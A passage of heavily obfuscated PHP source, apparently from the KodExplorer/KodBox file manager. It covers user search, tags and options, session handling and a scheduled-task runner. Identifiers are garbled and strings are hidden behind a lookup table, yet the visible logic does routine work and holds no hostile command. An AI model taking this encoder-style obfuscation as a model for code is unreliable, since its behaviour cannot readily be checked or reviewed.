$Òú¨ËôÂ[393])) { $àÜ½İÛî = $this->_searchFromMeta($Òú¨ËôÂ[559], $ÃÛÁİ„, 10); $èÑœØ® = $this->_searchFromMeta($Òú¨ËôÂ[560], $ÃÛÁİ„, 10); $¢èãÎá  = array_merge($àÜ½İÛî, $èÑœØ®, $ª¡¡ïçå[$Òú¨ËôÂ[446]]); $ª¡¡ïçå[$Òú¨ËôÂ[446]] = array_unique_by_key($¢èãÎá , $Òú¨ËôÂ[1548]); $ª¡¡ïçå[$Òú¨ËôÂ[443]][$Òú¨ËôÂ[444]] = count($ª¡¡ïçå[$Òú¨ËôÂ[446]]); $ª¡¡ïçå[$Òú¨ËôÂ[443]][$Òú¨ËôÂ[445]] = ceil($ª¡¡ïçå[$Òú¨ËôÂ[443]][$Òú¨ËôÂ[444]] / $ª¡¡ïçå[$Òú¨ËôÂ[443]][$Òú¨ËôÂ[439]]); } $this->_listDataApply($ª¡¡ïçå[$Òú¨ËôÂ[446]]); $this->_filterByGroup($ª¡¡ïçå, $Î†¬Ö ‘); return $ª¡¡ïçå; } private function _filterByGroup(&$ßÏ†®à—, $§§êØ—Ø) { $ƒ³ãï—º =& $_SERVER[”øäÃÍª]; if (!$§§êØ—Ø) { return $ßÏ†®à—; } foreach ($ßÏ†®à—[$ƒ³ãï—º[446]] as $¦¼¿êÖˆ => &$ÒÆÚá×) { $ÂöĞ„Â– = array_to_keyvalue($ÒÆÚá×[$ƒ³ãï—º[1449]], $ƒ³ãï—º[12], $ƒ³ãï—º[1450]); if (!in_array($§§êØ—Ø, $ÂöĞ„Â–)) { unset($ßÏ†®à—[$ƒ³ãï—º[446]][$¦¼¿êÖˆ]); } } unset($ÒÆÚá×); $ßÏ†®à—[$ƒ³ãï—º[446]] = array_values($ßÏ†®à—[$ƒ³ãï—º[446]]); $ßÏ†®à—[$ƒ³ãï—º[443]] = array($ƒ³ãï—º[2287] => count($ßÏ†®à—[$ƒ³ãï—º[446]]), $ƒ³ãï—º[2397] => $ßÏ†®à—[$ƒ³ãï—º[443]][$ƒ³ãï—º[439]], $ƒ³ãï—º[2396] => 1, $ƒ³ãï—º[2398] => 1); } private function _searchFromMeta($ÇôÕõˆè, $ŒÄéÒè®, $ãÕˆï†·) { $¨İí¡â =& $_SERVER[”øäÃÍª]; $ŒÄéÒè® = strtolower($ŒÄéÒè®); $ıÆíÅ”Ü = array($¨İí¡â[95] => $ÇôÕõˆè, $¨İí¡â[451] => array($¨İí¡â[473], "\45{$ŒÄéÒè®}\x25")); $ıÆíÅ”Ü = $this->parseWhereLike($ıÆíÅ”Ü); $ğÃíäÚ¢ = Model($¨İí¡â[2672])->where($ıÆíÅ”Ü)->limit($ãÕˆï†·)->select(); if (!$ğÃíäÚ¢) { return array(); } $ğÃíäÚ¢ = array_to_keyvalue($ğÃíäÚ¢, $¨İí¡â[12], $¨İí¡â[1548]); $ÈÒ®ë±ê = $this->where(array($¨İí¡â[1925] => array($¨İí¡â[7], $ğÃíäÚ¢)))->select(); if (!$ÈÒ®ë±ê) { return array(); } return $ÈÒ®ë±ê; } private function _listDataApplyItem($¸»ÆÑ¬Ø) { $ìİĞ«ºè = array($¸»ÆÑ¬Ø); $this->_listDataApply($ìİĞ«ºè); return $ìİĞ«ºè[0]; } private function _listDataApply(&$¬˜ •óš) { $ü“Û·ç =& $_SERVER[”øäÃÍª]; if (!$¬˜ •óš) { return; } array_remove_key($¬˜ •óš, $ü“Û·ç[1008]); $»ÜÈ‡ø = array_to_keyvalue($¬˜ •óš, $ü“Û·ç[12], $ü“Û·ç[1548]); $this->_listAppendGroup($¬˜ •óš, $»ÜÈ‡ø); $this->_listAppendMeta($¬˜ •óš, $»ÜÈ‡ø); $this->_listAppendSourceRoot($¬˜ •óš, $»ÜÈ‡ø); } private function _listAppendSourceRoot(&$Âƒ¥¸™ù, $ÒË¨ÑÃ¯) { $…çß¦Ê =& $_SERVER[”øäÃÍª]; $¹ìÉ·Ùû = Model($…çß¦Ê[941])->listSourceRoot(SourceModel::TYPE_USER, $ÒË¨ÑÃ¯); $¹ìÉ·Ùû = array_to_keyvalue($¹ìÉ·Ùû, $…çß¦Ê[597]); $¹ìÉ·Ùû = array_remove_key($¹ìÉ·Ùû, $…çß¦Ê[597]); foreach ($Âƒ¥¸™ù as &$íü»î¯Ç) { $íü»î¯Ç[$…çß¦Ê[90]] = $¹ìÉ·Ùû[$íü»î¯Ç[$…çß¦Ê[1548]]] ? $¹ìÉ·Ùû[$íü»î¯Ç[$…çß¦Ê[1548]]] : array(); } unset($íü»î¯Ç); } private function _listAppendGroup(&$˜±ñÔ×ú, $¹êßà¡) { $ê÷§Ş±½ =& $_SERVER[”øäÃÍª]; $¸“İ—Ù = array($ê÷§Ş±½[1548] => array($ê÷§Ş±½[7], $¹êßà¡)); $Ë£ãÑØÅ = Model($ê÷§Ş±½[2232])->where($¸“İ—Ù)->select(); $ß“î¦ÖÄ = array_to_keyvalue($Ë£ãÑØÅ, $ê÷§Ş±½[12], $ê÷§Ş±½[1450]); $ß“î¦ÖÄ = array_remove_value(array_unique($ß“î¦ÖÄ), $ê÷§Ş±½[228]); if (!$ß“î¦ÖÄ || !$Ë£ãÑØÅ) { return; } $¸“İ—Ù = array($ê÷§Ş±½[1450] => array($ê÷§Ş±½[7], $ß“î¦ÖÄ)); $Ê¬¯×ò˜ = Model($ê÷§Ş±½[1448])->field($ê÷§Ş±½[2673])->where($¸“İ—Ù)->select(); $Ê¬¯×ò˜ = array_to_keyvalue($Ê¬¯×ò˜, $ê÷§Ş±½[1450]); $Ë£ãÑØÅ = array_to_keyvalue_group($Ë£ãÑØÅ, $ê÷§Ş±½[1548]); foreach ($Ë£ãÑØÅ as &$ñşäüıŠ) { $±¯âİ¡ = array(); foreach ($ñşäüıŠ as $Ë¿…ô) { if (!$Ë¿…ô[$ê÷§Ş±½[1595]]) { continue; } $„ùß×Ï = Model($ê÷§Ş±½[599])->listData($Ë¿…ô[$ê÷§Ş±½[1595]]); $±¯âİ¡[] = array($ê÷§Ş±½[1450] => $Ë¿…ô[$ê÷§Ş±½[1450]], $ê÷§Ş±½[2674] => $Ê¬¯×ò˜[$Ë¿…ô[$ê÷§Ş±½[1450]]][$ê÷§Ş±½[32]], $ê÷§Ş±½[612] => $Ê¬¯×ò˜[$Ë¿…ô[$ê÷§Ş±½[1450]]][$ê÷§Ş±½[612]], $ê÷§Ş±½[510] => $„ùß×Ï); } $ñşäüıŠ = $±¯âİ¡; } unset($ñşäüıŠ); foreach ($˜±ñÔ×ú as &$ÉÂ¿ĞëÁ) { $ÉÂ¿ĞëÁ[$ê÷§Ş±½[1449]] = array(); if (isset($Ë£ãÑØÅ[$ÉÂ¿ĞëÁ[$ê÷§Ş±½[1548]]])) { $ÉÂ¿ĞëÁ[$ê÷§Ş±½[1449]] = $Ë£ãÑØÅ[$ÉÂ¿ĞëÁ[$ê÷§Ş±½[1548]]]; } } unset($ÉÂ¿ĞëÁ); } public function userAppendGroup($Æ™¬“ˆ¹) { $Ú¹Ø¡¿ =& $_SERVER[”øäÃÍª]; if (!$Æ™¬“ˆ¹) { return array(); } $this->_listAppendGroup($Æ™¬“ˆ¹, array_to_keyvalue($Æ™¬“ˆ¹, $Ú¹Ø¡¿[12], $Ú¹Ø¡¿[1548])); return $Æ™¬“ˆ¹; } private function _listAppendMeta(&$şĞŒ§¡ø, $¡ÊÄæòı) { $âÂË’ Š =& $_SERVER[”øäÃÍª]; $…ìıÂÄ™ = UserJobModel::JOB_KEY; $™ùØĞù = array($âÂË’ Š[2228]); $ËÒÔÁ— = array($âÂË’ Š[1548] => array($âÂË’ Š[7], $¡ÊÄæòı)); $åäØÉÃä = Model($âÂË’ Š[2649])->where($ËÒÔÁ—)->select(); $¶•£îÎ§ = array(); foreach ($åäØÉÃä as $‡ñÂÒš) { $÷èÆØú¸ = $‡ñÂÒš[$âÂË’ Š[1548]]; if (!isset($¶•£îÎ§[$÷èÆØú¸])) { $¶•£îÎ§[$÷èÆØú¸] = array(); } $¶•£îÎ§[$÷èÆØú¸][$‡ñÂÒš[$âÂË’ Š[95]]] = $‡ñÂÒš[$âÂË’ Š[451]]; } $ÁÆŞ…‡‹ = Model($âÂË’ Š[2675]); foreach ($şĞŒ§¡ø as &$“°‡Ê÷¦) { $÷èÆØú¸ = $“°‡Ê÷¦[$âÂË’ Š[1548]]; $û¸Øû = isset($¶•£îÎ§[$÷èÆØú¸]) ? $¶•£îÎ§[$÷èÆØú¸] : array(); $“°‡Ê÷¦[$âÂË’ Š[563]] = array_field_key($û¸Øû, $™ùØĞù); $“°‡Ê÷¦[$âÂË’ Š[2676]] = array(); if (isset($û¸Øû[$…ìıÂÄ™])) { $“°‡Ê÷¦[$âÂË’ Š[2676]] = $ÁÆŞ…‡‹->getUserJobInfo($û¸Øû[$…ìıÂÄ™]); } } unset($“°‡Ê÷¦); } protected function groupUserAll($ğ˜¤¹˜) { $š˜×Ñì€ =& $_SERVER[”øäÃÍª]; if (!$ğ˜¤¹˜) { return !1; } $åùä“äÂ = Model($š˜×Ñì€[2232])->field($š˜×Ñì€[1548])->where(array($š˜×Ñì€[1450] => array($š˜×Ñì€[7], $ğ˜¤¹˜)))->select(); $åùä“äÂ = array_to_keyvalue($åùä“äÂ, $š˜×Ñì€[12], $š˜×Ñì€[1548]); return array_unique($åùä“äÂ); } public function userSearch($¨£“İ¶‰, $¾‡¤ŸÉ× = "\52") { return Model($_SERVER[”øäÃÍª][625])->where($¨£“İ¶‰)->field($¾‡¤ŸÉ×)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\137\157\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($êî˜¦æ) { return "\125\163\x65\x72\x4f\x70\x74\x69\157\x6e\x5f{$êî˜¦æ}\137" . KodUser::id(); } protected function filterWhere($Ôôå”´ë) { $Ôôå”´ë[$_SERVER[”øäÃÍª][1548]] = KodUser::id(); return $Ôôå”´ë; } public function cacheRemoveUser($¤Ğ²Ç¼ƒ, $Íµ‹øê…) { return Cache::remove("\x55\x73\145\x72\x4f\160\164\151\x6f\156\137{$¤Ğ²Ç¼ƒ}\137" . $Íµ‹øê…); } protected function optionDefault($õßÙŞ‚ = '') { $’õ¶â× =& $_SERVER[”øäÃÍª]; if ($õßÙŞ‚ == $’õ¶â×[12]) { return $GLOBALS[$’õ¶â×[6]][$’õ¶â×[2677]]; } if ($õßÙŞ‚ == $’õ¶â×[2678]) { return $GLOBALS[$’õ¶â×[6]][$’õ¶â×[2679]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\x74\141\147\x4c\151\163\x74"; public $modelType = "\x55\x73\x65\162\x4f\160\164\x69\157\156"; public $field = array("\x6e\x61\155\145", "\163\x74\x79\x6c\x65", "\x73\x6f\x72\164"); public function listData($ôÏ°¾â© = false, $ôÏÂÁ‹ = "\163\x6f\x72\x74", $ùª›¾æ² = false) { return parent::listData($ôÏ°¾â©, $ôÏÂÁ‹, $ùª›¾æ²); } public function remove($›ò¼æÍ©) { return parent::remove($›ò¼æÍ©); } public function add($•ÇÎƒ, $š¤š §° = "\154\x61\x62\145\154\55\147\162\x65\171\55\156\x6f\x72\x6d\x61\154") { $”Šæ˜„î =& $_SERVER[”øäÃÍª]; if ($this->findByName($•ÇÎƒ)) { return !1; } $Ã«´Í = array($”Šæ˜„î[517] => $•ÇÎƒ, $”Šæ˜„î[582] => $š¤š §°, $”Šæ˜„î[2144] => $this->getSort($”Šæ˜„î[335]) + 1); return parent::insert($Ã«´Í); } public function update($“Öâ¹Ê, $ÑÅä´üª) { $èŞ³í¾ =& $_SERVER[”øäÃÍª]; $÷ã­şÛ¦ = $this->listData($“Öâ¹Ê); $±á¤…Ì = $this->findByName($ÑÅä´üª[$èŞ³í¾[32]]); if (!$÷ã­şÛ¦ || $±á¤…Ì && $±á¤…Ì[$èŞ³í¾[487]] != $÷ã­şÛ¦[$èŞ³í¾[487]]) { return !1; } return parent::update($“Öâ¹Ê, $ÑÅä´üª); } public function moveTop($™ƒï¸óˆ) { $ó Áøşó =& $_SERVER[”øäÃÍª]; $‡È„¡¹Š = parent::listData(); $Í¿î²¸Á = $this->getSort($ó Áøşó[334]); foreach ($‡È„¡¹Š as &$‡¢»÷ñ·) { if ($‡¢»÷ñ·[$ó Áøşó[487]] == $™ƒï¸óˆ) { $‡¢»÷ñ·[$ó Áøşó[2162]] = $Í¿î²¸Á; continue; } $‡¢»÷ñ·[$ó Áøşó[2162]] += 1; } unset($‡¢»÷ñ·); return parent::resetData($‡È„¡¹Š); } public function moveBottom($¹ÚíŸ») { $ÚÖ¶ßÂ¦ =& $_SERVER[”øäÃÍª]; $¢ü—úÉÜ = $this->getSort($ÚÖ¶ßÂ¦[335]) + 1; return parent::update($¹ÚíŸ», array($ÚÖ¶ßÂ¦[2162] => $¢ü—úÉÜ)); } public function resetSort($Î´ÀÜ–Å) { $Å•µˆŞ =& $_SERVER[”øäÃÍª]; $áéŠÅ¢É = array(); $Î´ÀÜ–Å = is_array($Î´ÀÜ–Å) ? $Î´ÀÜ–Å : array(); for ($ø±™ÃçÆ = 0; $ø±™ÃçÆ < count($Î´ÀÜ–Å); $ø±™ÃçÆ++) { $áéŠÅ¢É[$Î´ÀÜ–Å[$ø±™ÃçÆ] . $Å•µˆŞ[12]] = $ø±™ÃçÆ + 1; } $¶¶¤†ğ§ = parent::listData(); foreach ($¶¶¤†ğ§ as &$Ç´Ëò×ø) { $â¬Ü—ÙÁ = $áéŠÅ¢É[$Ç´Ëò×ø[$Å•µˆŞ[487]]]; $Ç´Ëò×ø[$Å•µˆŞ[2162]] = $â¬Ü—ÙÁ ? $â¬Ü—ÙÁ : $Ç´Ëò×ø[$Å•µˆŞ[2162]]; } unset($Ç´Ëò×ø); return parent::resetData($¶¶¤†ğ§); } private function getSort($Ğ˜ØËÚü) { $÷º¶«Ø„ =& $_SERVER[”øäÃÍª]; $œãñã½û = parent::listData(); $ÀäºêÖ» = array_to_keyvalue($œãñã½û, $÷º¶«Ø„[12], $÷º¶«Ø„[2162]); if (!$ÀäºêÖ») { $ÀäºêÖ» = array(0); } $áÖË– = $Ğ˜ØËÚü == $÷º¶«Ø„[335] ? max($ÀäºêÖ») : min($ÀäºêÖ»); return intval($áÖË–); } } goto eéßÔ ½ã; fİ”Ñ‡ååñ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $†øªüì¯ =& $_SERVER[”øäÃÍª]; static $óÁˆ©º = false; if ($óÁˆ©º) { return $óÁˆ©º; } $¶·îúûÓ = $GLOBALS[$†øªüì¯[6]][$†øªüì¯[424]]; self::$sessionTime = $¶·îúûÓ[$†øªüì¯[1880]]; $Ú¬íœÈ = isset($GLOBALS[$†øªüì¯[1881]]) ? $GLOBALS[$†øªüì¯[1881]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ú¬íœÈ)) { self::$sessionSign = Cookie::get($Ú¬íœÈ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ú¬íœÈ, self::$sessionSign, self::$sessionTime); $–Ìğ¯Õ = $¶·îúûÓ[$†øªüì¯[1882]]; $ÀÈ½±½¿ = $¶·îúûÓ[$–Ìğ¯Õ]; $Õ“ô¾Œú = $¶·îúûÓ[$†øªüì¯[944]]; switch ($–Ìğ¯Õ) { case $†øªüì¯[21]: self::$handle = Model($†øªüì¯[945]); break; case $†øªüì¯[946]: self::$handle = new CacheRedis($ÀÈ½±½¿, $Õ“ô¾Œú); break; case $†øªüì¯[947]: self::$handle = new CacheMemcached($ÀÈ½±½¿, $Õ“ô¾Œú); break; case $†øªüì¯[230]: $ÀÈ½±½¿[$†øªüì¯[87]] = $ÀÈ½±½¿[$†øªüì¯[87]] . $†øªüì¯[1883]; self::$handle = new CacheFile($ÀÈ½±½¿, $Õ“ô¾Œú); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$†øªüì¯[1617]]) || time() - self::$data[$†øªüì¯[1617]] >= 5) { self::dataSave(); } } $óÁˆ©º = new self(); return $óÁˆ©º; } public static function getBySign($úüÁ‡«ó) { $«Ò¾àï¿ = self::$handle->get($úüÁ‡«ó); $«Ò¾àï¿ = unserialize($«Ò¾àï¿); return is_array($«Ò¾àï¿) ? $«Ò¾àï¿ : array(); } public static function setBySign($® «À¼ø, $¨ŠÔ€ñı) { self::$sessionSign = $® «À¼ø; self::$data = $¨ŠÔ€ñı; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[”øäÃÍª][1617]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($ÃµÇöíĞ = false) { if ($ÃµÇöíĞ) { self::$sessionSign = $ÃµÇöíĞ; } self::init(); return self::$sessionSign; } public static function set($†§´ä‡İ, $Ğş›Ï¶Ä = false) { self::init(); if (is_array($†§´ä‡İ)) { foreach ($†§´ä‡İ as $„ÖÑ‹¢î => $Í Ì¹¿û) { array_set_value(self::$data, $„ÖÑ‹¢î, $Í Ì¹¿û); } } else { array_set_value(self::$data, $†§´ä‡İ, $Ğş›Ï¶Ä); } self::dataSave(); } public static function get($¼Ó÷®İò = false) { self::init(); if (!$¼Ó÷®İò) { return self::$data; } return array_get_value(self::$data, $¼Ó÷®İò); } public static function remove($«ÏÎËŒ) { self::init(); unset(self::$data[$«ÏÎËŒ]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[”øäÃÍª][953])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Å±Ÿ· =& $_SERVER[”øäÃÍª]; if (self::valueGet($Å±Ÿ·[859]) != $Å±Ÿ·[91]) { return; } if (self::valueGet($Å±Ÿ·[1884]) == $Å±Ÿ·[91]) { $‹ªØäõÄ = self::valueGet($Å±Ÿ·[1885]); if (time() - $‹ªØäõÄ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Å±Ÿ·[1884], $Å±Ÿ·[91]); self::log($Å±Ÿ·[1886] . ACTION . $Å±Ÿ·[1887]); Hook::bind($Å±Ÿ·[1888], $Å±Ÿ·[1889]); $³å«Š´ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Å±Ÿ·[859]) != $Å±Ÿ·[91]) { self::valueSet($Å±Ÿ·[1884], $Å±Ÿ·[228]); self::log($Å±Ÿ·[1890]); die; } $™¢Ö• = time(); if ($™¢Ö• - $³å«Š´ >= 60) { self::valueSet(array($Å±Ÿ·[1884] => $Å±Ÿ·[91], $Å±Ÿ·[1885] => $™¢Ö•)); $³å«Š´ = $™¢Ö•; } if (!file_exists(USER_SYSTEM . $Å±Ÿ·[1891])) { self::valueSet(array($Å±Ÿ·[1884] => $Å±Ÿ·[228], $Å±Ÿ·[859] => $Å±Ÿ·[228])); self::log($Å±Ÿ·[1892]); die; } $øèõ“¼ = file_get_contents(BASIC_PATH . $Å±Ÿ·[1893]); $Ï›‹ÄÆ„ = KOD_VERSION . $Å±Ÿ·[10] . KOD_VERSION_BUILD; $§¦”õÓß = match_text($øèõ“¼, $Å±Ÿ·[1894]) . $Å±Ÿ·[10] . match_text($øèõ“¼, $Å±Ÿ·[1895]); if ($§¦”õÓß != $Ï›‹ÄÆ„) { self::restart(); self::log("\x73\164\x6f\160\145\x64\x2e\133\x76\145\162\x73\151\157\x6e\x20\x75\x70\x64\141\x74\145\73{$versionNow}\x20\x3d\76\x20{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ô²Åßƒ™ =& $_SERVER[”øäÃÍª]; http_close(); $GLOBALS[$Ô²Åßƒ™[1896]] = 1; $_SERVER[$Ô²Åßƒ™[1897]] = $Ô²Åßƒ™[1898]; $_COOKIE = array(); $GLOBALS[$Ô²Åßƒ™[1899]] = 1; $GLOBALS[$Ô²Åßƒ™[1900]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $–¸ÙŒİ =& $_SERVER[”øäÃÍª]; http_close(); self::valueSet($–¸ÙŒİ[859], $–¸ÙŒİ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($–¸ÙŒİ[1884] => $–¸ÙŒİ[228], $–¸ÙŒİ[859] => $–¸ÙŒİ[91])); self::log($–¸ÙŒİ[1901]); } public static function taskSwitch() { $Ï·Š’Øš =& $_SERVER[”øäÃÍª]; $ç›æ©© = self::valueGet($Ï·Š’Øš[859]) == $Ï·Š’Øš[91] ? $Ï·Š’Øš[228] : $Ï·Š’Øš[91]; self::valueSet($Ï·Š’Øš[859], $ç›æ©©); } public static function shutdownEvent() { $„íÏ‘Ğ¨ =& $_SERVER[”øäÃÍª]; self::valueSet($„íÏ‘Ğ¨[1884], $„íÏ‘Ğ¨[228]); self::log($„íÏ‘Ğ¨[1902]); } public static function config($†¶îªŒ, $Êˆõ„Ç¤) { self::valueSet($_SERVER[”øäÃÍª][859], $†¶îªŒ); } private static function taskRunAll() { $íĞ =& $_SERVER[”øäÃÍª]; $£¾Ÿ¼¾ş = timeFloat(); $ˆ™ˆ½ä = Model($íĞ[1903])->listData(); $ÃÉê™‚ = count($ˆ™ˆ½ä); for ($Ó‘µÕ¯… = 0; $Ó‘µÕ¯… < $ÃÉê™‚; $Ó‘µÕ¯…++) { $ô™é¹“  = $ˆ™ˆ½ä[$Ó‘µÕ¯…]; if (!$ô™é¹“ [$íĞ[487]] || $ô™é¹“ [$íĞ[1904]] != $íĞ[91]) { continue; } if (!self::taskTimeCheck($ô™é¹“ )) { continue; } self::taskRun($ô™é¹“ ); } Hook::trigger($íĞ[1905]); self::taskQueueRun($£¾Ÿ¼¾ş); } private static function taskQueueRun($•èĞÜÔ) { $ÎÏ²¬ˆ = 10; while (!0) { $¤ãÃî = TaskQueue::run(); if ($¤ãÃî === !1) { break; } if (timeFloat() - $•èĞÜÔ >= $ÎÏ²¬ˆ) { break; } } } private static function taskTimeCheck($‘øÏå•) { $«µå¹­÷ =& $_SERVER[”øäÃÍª]; $…’”îÆ´ = json_decode($‘øÏå•[$«µå¹­÷[204]], !0); $Ñ»Ïí¢Õ = intval($‘øÏå•[$«µå¹­÷[1885]]); $×å§äÇ = strtotime($«µå¹­÷[1906] . $…’”îÆ´[$«µå¹­÷[1907]] . $«µå¹­÷[1908]) - strtotime($«µå¹­÷[1909]); $‚£˜ß· = time() - strtotime(date($«µå¹­÷[1910]) . $«µå¹­÷[1911]); $ÜãÓŞÜ = $‚£˜ß· >= $×å§äÇ && $‚£˜ß· <= $×å§äÇ + 3600; switch ($…’”îÆ´[$«µå¹­÷[33]]) { case $«µå¹­÷[1912]: if (time() - $Ñ»Ïí¢Õ < 3600 * 24 * 30) { return !1; } if ($…’”îÆ´[$«µå¹­÷[1912]] == date($«µå¹­÷[1913]) && $ÜãÓŞÜ) { return !0; } break; case $«µå¹­÷[1914]: if (time() - $Ñ»Ïí¢Õ < 3600 * 24 * 7) { return !1; } $­©ÍËí¯ = date($«µå¹­÷[1915]) == 0 ? 7 : date($«µå¹­÷[1915]); if ($…’”îÆ´[$«µå¹­÷[1914]] == $­©ÍËí¯ && $ÜãÓŞÜ) { return !0; } break; case $«µå¹­÷[1907]: if (time() - $Ñ»Ïí¢Õ < 3600 * 24) { return !1; } if ($ÜãÓŞÜ) { return !0; } break; case $«µå¹­÷[1916]: if (time() - $Ñ»Ïí¢Õ >= floatval($…’”îÆ´[$«µå¹­÷[1916]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $é½ÛÎÀ¾ =& $_SERVER[”øäÃÍª]; static $Ñ‘õÑŸç = 0; $¼Œ¼çÑã = 300; if (!$Ñ‘õÑŸç) { $Ñ‘õÑŸç = time(); } if (time() - $Ñ‘õÑŸç < $¼Œ¼çÑã) { return; } $Ñ‘õÑŸç = time(); $…¾•Ü¾ = Model($é½ÛÎÀ¾[605])->db($é½ÛÎÀ¾[12]); if ($…¾•Ü¾) { $…¾•Ü¾->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($é½ÛÎÀ¾[1917], $é½ÛÎÀ¾[1918]); die; } } public static function taskRun($ïÀ°…±¨) { $¡ò½Ñ¤ø =& $_SERVER[”øäÃÍª]; self::log($¡ò½Ñ¤ø[1919] . $ïÀ°…±¨[$¡ò½Ñ¤ø[487]] . $¡ò½Ñ¤ø[1920] . $ïÀ°…±¨[$¡ò½Ñ¤ø[32]] . $¡ò½Ñ¤ø[1921] . $ïÀ°…±¨[$¡ò½Ñ¤ø[1519]]); Model($¡ò½Ñ¤ø[1903])->run($ïÀ°…±¨[$¡ò½Ñ¤ø[487]]); $­ùòå§ = timeFloat(); $ÉÈŸ«ºİ = $¡ò½Ñ¤ø[12]; switch ($ïÀ°…±¨[$¡ò½Ñ¤ø[33]]) { case $¡ò½Ñ¤ø[382]: $±ƒõöÀ¤ = url_request($ïÀ°…±¨[$¡ò½Ñ¤ø[1519]], $¡ò½Ñ¤ø[1561], !1, !1, !1, !1, 10); if ($±ƒõöÀ¤[$¡ò½Ñ¤ø[859]]) { $ÉÈŸ«ºİ = strlen($±ƒõöÀ¤[$¡ò½Ñ¤ø[1345]]); } break; case $¡ò½Ñ¤ø[1922]: $ÉÈŸ«ºİ = Hook::apply($ïÀ°…±¨[$¡ò½Ñ¤ø[1519]]); default: break; } Model($¡ò½Ñ¤ø[1923])->add(array($¡ò½Ñ¤ø[1924] => $¡ò½Ñ¤ø[12], $¡ò½Ñ¤ø[1925] => $¡ò½Ñ¤ø[228], $¡ò½Ñ¤ø[33] => $¡ò½Ñ¤ø[1926] . $ïÀ°…±¨[$¡ò½Ñ¤ø[487]], $¡ò½Ñ¤ø[1927] => json_encode(array($¡ò½Ñ¤ø[32] => $ïÀ°…±¨[$¡ò½Ñ¤ø[32]], $¡ò½Ñ¤ø[1928] => timeFloat() - $­ùòå§, $¡ò½Ñ¤ø[865] => $ÉÈŸ«ºİ)))); $©æ»‹ëµ = $ÉÈŸ«ºİ ? $¡ò½Ñ¤ø[1929] . $ÉÈŸ«ºİ : $¡ò½Ñ¤ø[12]; self::log($¡ò½Ñ¤ø[1930] . $ïÀ°…±¨[$¡ò½Ñ¤ø[487]] . $¡ò½Ñ¤ø[175] . $©æ»‹ëµ); return !0; } public static function valueGet($Ì¾øæ³Ì) { $¡…“şË› =& $_SERVER[”øäÃÍª]; $Íæ¸à‰ƒ = $¡…“şË›[1931]; $†¹ˆ¯½ = Model($¡…“şË›[530])->get($Ì¾øæ³Ì, $Íæ¸à‰ƒ); if (is_null($†¹ˆ¯½)) { Model($¡…“şË›[530])->set($¡…“şË›[859], $¡…“şË›[91], $Íæ¸à‰ƒ); Model($¡…“şË›[530])->set($¡…“şË›[1884], $¡…“şË›[228], $Íæ¸à‰ƒ); $†¹ˆ¯½ = Model($¡…“şË›[530])->get($Ì¾øæ³Ì, $Íæ¸à‰ƒ); } return $†¹ˆ¯½; } private static function valueSet($ù€Œ Ïã, $úîîµ¹× = false) { $óŠÂ£¦ú =& $_SERVER[”øäÃÍª]; $Ó•ìø‚— = $óŠÂ£¦ú[1932]; CacheLock::lock($Ó•ìø‚—); $Úš´²Öğ = Model($óŠÂ£¦ú[530])->set($ù€Œ Ïã, $úîîµ¹×, $óŠÂ£¦ú[1931]); CacheLock::unlock($Ó•ìø‚—); return $Úš´²Öğ; } protected static function log($ÕŒÉ—÷) { write_log($ÕŒÉ—÷, $_SERVER[”øäÃÍª][1918]); } private static function cacheClear() { $øàï¨‹í =& $_SERVER[”øäÃÍª]; Cache::clearMemory(Model($øàï¨‹í[530])->cacheKey($øàï¨‹í[1931])); Cache::clearMemory(Model($øàï¨‹í[530])->cacheKey($øàï¨‹í[1933])); Model($øàï¨‹í[1903])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\162\165\156\x6e\x69\156\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¡ÁæÀÊê, $Æ¨ú¨ØÔ = '', $ıŒ€‹å = 0, $Ã¿ÏŒŞş = '') { $Ä¢‹¿õë =& $_SERVER[”øäÃÍª]; if (self::get($¡ÁæÀÊê)) { return; } $this->task = array($Ä¢‹¿õë[487] => $¡ÁæÀÊê, $Ä¢‹¿õë[1548] => USER_ID, $Ä¢‹¿õë[1819] => $Ã¿ÏŒŞş, $Ä¢‹¿õë[548] => $Ä¢‹¿õë[12], $Ä¢‹¿õë[33] => $Æ¨ú¨ØÔ, $Ä¢‹¿õë[1186] => $Ä¢‹¿õë[12], $Ä¢‹¿õë[1184] => $ıŒ€‹å, $Ä¢‹¿õë[1934] => 0, $Ä¢‹¿õë[1935] => 0, $Ä¢‹¿õë[1936] => 0, $Ä¢‹¿õë[1937] => timeFloat(), $Ä¢‹¿õë[1938] => 0, $Ä¢‹¿õë[1939] => 0, $Ä¢‹¿õë[1940] => 0, $Ä¢‹¿õë[1941] => 0, $Ä¢‹¿õë[859] => $Ä¢‹¿õë[1884]); $GLOBALS[$Ä¢‹¿õë[1942]] = 1; Hook::bind($Ä¢‹¿õë[1888], array($this, $Ä¢‹¿õë[1943])); Hook::bind($Ä¢‹¿õë[1944], 